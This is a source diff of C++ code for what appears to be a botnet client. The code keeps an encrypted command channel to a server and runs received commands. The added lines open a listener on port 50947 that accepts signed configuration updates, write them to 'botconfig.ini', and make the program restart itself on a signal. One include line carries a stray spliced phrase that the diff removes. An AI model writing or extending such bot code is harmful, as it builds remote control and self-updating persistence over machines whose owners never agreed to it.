@@ -10,12 +10,13 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 
-#include <cryptopp/rsa.h>British National Oil
+#include <cryptopp/rsa.h>
 #include <cryptopp/sha.h>
 #include <cryptopp/filters.h>
 #include <cryptopp/osrng.h>
 #include <cryptopp/aes.h>
 #include <cryptopp/modes.h>
+#include <cryptopp/pssr.h>
 
 #include "base64.h"
 
@@ -52,7 +53,10 @@ FILE *processOutput;
 
 char *buf;
 
+int currentVersion = 0;
 int mainSocket;
+int PID;
+int mainProcessPID;
 
 void recvDecrypted();
 void recvTimeout(int);
@@ -62,6 +66,7 @@ string encryptRSA(string text);
 void initRSA();
 void initNET();
 void initAES();
+void initSignals();
 void sendEncrypted(const byte *message, int len);
 void sendEncrypted(const char *message, int len);
 void* startCommand(void *);
@@ -69,6 +74,14 @@ void* startCommand(void *);
 void clearBuf() {
     for (int i = 0; i <= max; i++)
         buf[i] = 0;
+}
+
+void onExit() {
+    kill(PID, SIGKILL);
+}
+
+void restart(int signal) {
+    execlp("/proc/self/exe", NULL);
 }
 
 string encryptRSA(string text) {
@@ -184,7 +197,13 @@ void sendEncrypted(const char *message, int len) {
 
 void initMEM() {
     buf = (char *)malloc(max + 2) + 1;
+    mainProcessPID = getpid();
+}
+
+void initSignals() {
     signal(SIGALRM, recvTimeout);
+    signal(SIGUSR1, restart);
+    atexit(onExit);
 }
 
 void* startCommand(void *) {
@@ -203,25 +222,65 @@ void recvTimeout(int signal) {
     initAES();
 }
 
+void serveSocket(int socket) {
+    mainSocket = socket;
+    printf("connection established with id: %d\n", socket);
+    scanBuf();
+    if (strncmp(buf, "ask", 3) == 0) {
+
+    } else if (strncmp(buf, "set", 3) == 0) {
+        scanBuf();
+        string messageEncoded = std::string((char*)buf);
+        string message = base64_decode(messageEncoded);
+        scanBuf();
+        string signEncoded = std::string((char*)buf);
+        string sign = base64_decode(signEncoded);
+
+        RSASS<PSSR, SHA1>::Verifier verifier(*serverPub);
+        bool good = verifier.VerifyMessage((unsigned char*)message.c_str(), message.size(), (unsigned char*)sign.c_str(), sign.size());
+        int version = htonl(*(int*)message.c_str());
+        if (good && version > currentVersion) {
+            FILE *fout = fopen("botconfig.ini", "w");
+            fprintf(fout, "set\n%s\n", messageEncoded.c_str());
+            fprintf(fout, "%s\n", signEncoded.c_str());
+            fclose(fout);
+            kill(mainProcessPID, SIGUSR1);
+            _exit(0);
+        }
+
+    }
+    fflush(stdout);
+    close(socket);
+    printf("finishing fork()\n");
+}
+
 void IAMWHITE() {
-    if (fork() == 0) {
+    PID = fork();
+    if (PID == 0) {
         mainSocket = socket(AF_INET, SOCK_STREAM, 0);
         sockaddr_in ServerAddr;
         ServerAddr.sin_family = AF_INET;
         ServerAddr.sin_port = htons(50947);
         ServerAddr.sin_addr.s_addr = htonl(INADDR_ANY);
-        bind(mainSocket, (sockaddr*)&ServerAddr, sizeof(ServerAddr));
-        listen(mainSocket, 10);
-        while (1)
-            accept(mainSocket, NULL, NULL);
+        printf("binding... %d\n", bind(mainSocket, (sockaddr*)&ServerAddr, sizeof(ServerAddr)));
+        printf("listening: %d\n", listen(mainSocket, 100));
+        fflush(stdout);
+
+        while (1) {
+            int socket = accept(mainSocket, NULL, NULL);
+            if (fork() == 0) {
+                serveSocket(socket);
+                _exit(0);
+            }
+        }
     }
 }
 
 int main() {
-    IAMWHITE();
-
+    initSignals();
     initMEM();
     initRSA();
+    IAMWHITE();
     initNET();
     initAES();
 
@@ -237,6 +296,7 @@ int main() {
             sendEncrypted(buf - 1, strlen(buf) + 1);
         } else if (strncmp(buf, "ping", 4) == 0) {
             sendEncrypted("P", 1);
+        } else if (strncmp("DUMP WHITELIST", buf, 14) == 0) {
         } else {
             processOutput = (FILE*)buf;
             pthread_t thread;
